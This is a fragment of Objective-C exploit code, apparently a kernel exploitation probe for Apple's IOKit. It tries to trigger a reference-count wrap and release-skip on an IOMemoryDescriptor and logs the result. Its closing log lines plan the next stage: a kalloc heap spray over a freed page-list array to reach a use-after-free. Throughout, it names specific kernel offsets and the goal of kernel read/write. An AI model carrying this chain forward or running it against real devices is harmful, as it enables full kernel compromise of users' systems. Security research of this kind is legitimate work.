                            L(@"    the 0xa515f88 gate held and a kernel dmaref LEAKED on this object.");
                            skipEstablished = 1;
                        } else {
                            L(@"[-] release SKIPPED but post-op FAILED — teardown possible; NOT a skip verdict (honest).");
                        }
                    } else {
                        L(@"[-] release kr or oracle post-read contradicts skip — NO skip verdict (honest).");
                    }
                }
            }
        }
    } else {
        L(@"--- PHASE 3 SKIPPED (no lane, no oracle) ---");
    }
    SYNC();

    /* ---------- cleanup --------------------------------------------------- */
    if (mapped) mach_vm_deallocate(mach_task_self(), mapped, (mach_vm_size_t)P101_SURF_LEN);
    if (mdport) mach_port_deallocate(mach_task_self(), mdport);
    for (unsigned ci = 0; ci < nConn; ci++) IOServiceClose(p101_conns[ci]);
    if (dev && pDevRelease) pDevRelease(dev);
    if (surf) CFRelease(surf);
    CFRelease(dict);
    CFRelease(nSz);

    /* ---------- PHASE 4 — VERDICT ------------------------------------------ */
    L(@"=== VERDICT (p101-iomd-chain-v2) ===");
    L([NSString stringWithFormat:@"[*] chain: lane %@ / oracle %@ / retain-wrapped %@:",
       acquireConn ? @"Y" : @"N",
       nCorro ? @"CORROBORATED" : @"UNPROVEN",
       wrapped ? @"Y" : @"N"]);
    L([NSString stringWithFormat:@"[*] retains issued=%lu (u16 wrap theory). oracle candidates=%u corroborated=%u",
       retains, nOracle, nCorro]);
    if (skipEstablished) {
        L(@"[+] RELEASE-SKIP landed — one dmaref leaked on the armed object.");
        L(@"    THE +0x34 WRAP AND THE SKIP ARE STILL LEAD-QUALITY ONLY: no");
        L(@"    direct u16 read (that needs KRW), the u16 wrap is inferred, and");
        L(@"    the UAF / ioGMD page-list confusion was NOT attempted here.");
        L(@"    PERMA-ALIVE OBJECT + STALE PAGE-LIST = the evidence this tap");
        L(@"    leaves. No kread, no KRW, hasKread unchanged.");
    } else if (nCorro && acquireConn) {
        L(@"[!] chain: wrap issued + oracle live; release step DID NOT verify a SKIP (honest).");
    } else {
        L(@"[-] chain: NO corroborated oracle and/or NO acquire lane. 43684 UC");
        L(@"    walk-up still open (P086 hold). Nothing leaked, nothing freed.");
    }
    L(@"--- NEXT DESIGN (the page-list confusion shape, for the ledger) ---");
    L(@"  the ioGMD page-list array: 16B/entry, kalloc bl 0x9e18728 at");
    L(@"  0xa5081ec, u32 entry count at sub+0xe8, freepool head 0xa903db0.");
    L(@"  After a verified release-skip, the object stays alive with a stale");
    L(@"  [sub+0xe0] page list + [sub+0xe8] count; the confusion round sprays");
    L(@"  a controlled kalloc bucket over the freed array, then drives the");
    L(@"  still-alive IOMD deref = the UAF window. The count field is what");
    L(@"  the reset does NOT clear when the gate fires first.");
    L(@"  Route guard carries: twin 0xa511324 dec PANICS — the release must");
    L(@"  only go through a corroborated 0xa515d60 wrapper, never on a guess.");
    L([NSString stringWithFormat:@"[*] hasKread=%@ unchanged. Titan write is P102. T7 stays reach-only.",
       [P007Board shared].hasKread ? @"YES" : @"NO"]);

    [[P007Board shared] recordEvent:@"p101_iomd_chain"
                                 kind:@"fire"
                               detail:[NSString stringWithFormat:@"retains=%lu corro=%u skip=%d lane=%d",
                                       retains, nCorro, skipEstablished, acquireConn != 0]
                               source:P101_TAG];
    SYNC();
    if (fd >= 0) close(fd);
    return log;
}

@end